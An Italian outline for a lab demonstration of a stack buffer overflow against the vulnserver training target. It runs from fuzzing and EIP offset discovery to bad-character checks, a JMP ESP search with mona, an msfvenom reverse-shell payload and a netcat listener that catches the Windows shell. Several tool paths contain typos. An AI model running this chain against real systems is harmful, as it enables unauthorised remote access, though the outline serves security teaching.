Presentazione problema

Presentazione anatomia della memoria

Presentazione anatomia dello stack

Spiegazione registri ESP, EBP, EIP e cosa succede se si sovrascrivono

Spiegazione tool utilizzati

Inizio demo attacco

Spiegazione Spiking

Attaccare Immunity Debugger a vulnserver

Prima connessione a vulnserver (nc -nv 192.168.1.X 9999)

Comando (HELP)

Spiegazione comandi STATS,TRUN ecc...

Visualizzazione file stats.spk (gedit stats.spk)

Mandare in esecuzione stats.spk e far vedere che non crasha (generic_send_tcp 192.168.1.X 9999 stats.spk 0 0)

Visualizzazione file trun.spk (gedit trun.spk)

Mandare in esecuzione trun.spk e far vedere che non crasha (generic_send_tcp 192.168.1.X 9999 trun.spk 0 0)

Far vedere che è tutto stato riempito da "A"

Spiegazione Fuzzing e aprire script1.py (gedit script1.py)

Dare permessi al file script1 (chmod +x script1.py)

Eseguire file (./script1.py) e far vedere a quanti byte crasha il buffer

Creare un pattern di caratteri (/urs/share/metasplot-framework/tools/expoit/pattern_create.rb -l 3500)

Aprire script2.py e inserire la stringa generata in "offset"

Dare permessi a script2 ed eseguirlo

Vedere l'offset di EIP

Lanciare (/usr/share/metasplot-framework/tools/exploit/pattern_offset.rb -l 3500 -q OFFSET) per trovare il byte offset

Aprire script3.py e scrivere lo shellcode con l'offset trovato.

Lanciare script3.py e far vedere che l'EIP è diventato 42424242

Spiegazione dei "bad characters"

Prendere bad characters da github e metterli in script4.py

Lanciare script4 e cliccare su ESP, cliccare "Follow in dump" e far vedere che non ci sono bad chars.

Far vedere lo screen di un dump con bad chars

Far vedere mona.py e lanciarlo su Immunity nella console in basso (!mona modules)

Spiegare i false e perché il file dll è importante per noi

Lanciare (/usr/share/metasplot-framework/tools/exploit/nasm_shell.rb) e dare il comando JMP ESP

Lanciare su Immunity (!mona find -s "\xff\xe4" -m essfunc.dll)

(exit) su nasm per uscire, poi aprire script5 e spiegare perché l'indirizzo al contrario

Cliccare sulla freccia blu in alto su Immunity e scrivere l'indirizzo di prima per trovarlo, poi premere F2 per settarlo come breakpoint

Lanciare script5 e far vedere che abbiamo preso il breakpoint

Generare shellcode con (msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.X LPORT 4444 EXITFUNC=thread -f c -a x86 -b "\x00")

Aprire script6 con shellcode appena generato e spiegare il "padding" prima dell'overflow

Mettere Kali in ascolto con (nc -nvlp 4444)

Lanciare script6 e far vedere il controllo della shell di windows



